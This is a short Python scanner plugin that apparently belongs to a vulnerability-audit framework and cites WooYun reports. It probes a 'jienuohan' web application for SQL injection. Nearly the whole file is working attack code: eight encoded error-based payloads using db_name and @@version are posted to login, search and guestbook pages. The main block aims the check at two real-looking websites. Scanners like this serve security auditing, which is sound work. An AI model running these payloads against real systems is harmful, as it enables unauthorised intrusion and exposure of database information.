#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-070091
#refer:http://www.wooyun.org/bugs/wooyun-2010-077673
#refer:http://www.wooyun.org/bugs/wooyun-2010-082926

def assign(service, arg):
    if service == "jienuohan":
        return True, arg
              
def audit(arg):
     
    payloads = [
        'Web/Login.aspx',
        'web/KeySearch.aspx?searchid=1',
        'KeySearch.aspx',
        'KeySearch.aspx',
        'KeySearch.aspx',
        'liuyan.aspx',
        'liuyan.aspx',
        'liuyan.aspx',
        ]
    postdatas = [
        'username=1%27%20and%20db_name%281%29%3E1--',
        'operat=Search&state=&keyword=1%25%27%20and%20db_name%281%29%3E1--',
        'title=1%27%20AND%20db_name%281%29%3E1--',
        'author=1%27%20AND%20db_name%281%29%3E1--',
        'keyword=1%27%20AND%20db_name%281%29%3E1--',
        'LinkTel=1%27%2b%20convert%28int%2C%28db_name%281%29%29%29%20%2b%27',
        'Mail=1%27%2b%20convert%28int%2C%28db_name%281%29%29%29%20%2b%27',
        'username=1%27%2b%20%28select%20convert%28int%2C%28@@version%29%29%20FROM%20syscolumns%29%20%2b%27'
       
        ]
    
    for i in range(8):
        url = arg + payloads[i]
        code, head, res, errcode, _ = curl.curl2(url,postdatas[i])
        if 'master' in res :
            security_hole(arg+payloads[i])



if __name__ == '__main__':
    from dummy import *
    audit(assign('jienuohan','http://www.cnemergency.com/')[1])
    audit(assign('jienuohan','http://ctc.hlglzz.com/')[1])
